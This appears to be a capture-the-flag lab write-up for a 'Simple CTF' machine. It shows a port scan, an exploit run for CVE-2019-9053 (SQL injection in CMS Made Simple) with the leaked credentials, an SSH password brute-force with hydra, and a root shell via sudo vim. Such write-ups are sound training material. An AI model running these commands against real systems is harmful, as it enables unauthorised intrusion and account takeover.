# Simple CTF

IP = `10.10.21.247`

### Nmap
```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

```


### Exploit CVE-2019-9053
```
git clone https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3
git clone https://github.com/e-renna/CVE-2019-9053

install requests, termcolor

python3 csm_made_simple_injection.py -u http://10.10.19.252/simple --crack -w /usr/share/seclists/Passwords/common_corporate_passwords.lst
```

```
[+] Salt for password found: 1d16
[+] Username found: mitch
[+] Email found: admin@admin.p
[+] Password found: 0c01f4468bd75d7a84c1
```

`echo "0c01f4468bd75d7a84c1:1d16" > hash.txt`

exploi isnt working properly, but we got a username 'mitch'

### Brute-force

```
$ hydra -l mitch -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.21.247:2222

[2222][ssh] host: 10.10.21.247   login: mitch   password: secret
```

user.txt
```
G00d j0b, keep up!
```

### Privilgege Escalation

```
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```
mitch@Machine:~$ sudo vim -c ':!/bin/sh'

#
```

Got root!

root.txt
```
W3ll d0n3. You made it!
```
